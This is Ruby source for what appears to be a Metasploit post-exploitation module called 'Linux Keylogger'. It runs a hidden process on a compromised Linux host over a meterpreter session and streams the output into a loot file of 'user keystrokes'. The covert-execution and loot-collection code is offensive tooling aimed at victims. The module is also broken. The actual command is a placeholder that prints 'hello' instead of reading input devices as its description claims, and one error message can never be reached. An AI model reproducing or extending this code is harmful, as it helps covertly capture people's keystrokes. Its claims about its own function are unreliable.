##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Keylogger',
      'Description'   => %q{
          Run a keylogger by reading the /dev/input/event* files.
          You should run this as a job.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Eliott Teissonniere' ],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def exists_exe?(exe)
    vprint_status "Searching for #{exe} in the current $PATH..."
    path = get_env("PATH")
    if path.nil? or path.empty?
      return false
      vprint_error "No local $PATH set!"
    else
      vprint_status "$PATH is #{path.strip!}"
    end

    path.split(":").each{ |p|
      full_path = p + "/" + exe
      vprint_status "Searching for '#{full_path}' ..."
      return true if file_exist?(full_path)
    }

    return false
  end

  def run
    if !exists_exe?("python")
      print_error("No python executable found.")
      return
    end
    print_good("python available")

    loot = store_loot("host.linux.keystrokes", "text/plain", session, "Keystrokes on #{sysinfo['Computer']} - #{Time.now.to_s}\n\n", "keystrokes.txt", "User keystrokes")
    print_good("Logfile is #{loot}")

    keylogger_cmd = "python -c \"exec 'print(\\\"hello\\\")'\""

    # We have to reimplement cmd-exec in order to stream
    # the output
    print_status("Starting keylogger")

    start = Time.now.to_i
    session.response_timeout = 15
    process = session.sys.process.execute(keylogger_cmd, "", { "Hidden" => true, "Channelized" => true })

    print_good("Process started")

    while (d = process.channel.read)
      if d == ""
        if Time.now.to_i - start < 15
          sleep 0.1
        else
          print_error("Timeout")
          break
        end
      else
        # We have something!
        file_local_write(loot, d)
      end
    end

    # Normally we don't reach that part unless
    # the process is killed on the victim side

    begin
      process.channel.close
    rescue IOError => e
      # Nothing to do
    end

    process.close

    print_error("End of process, keylogger may have been killed")
  end
end
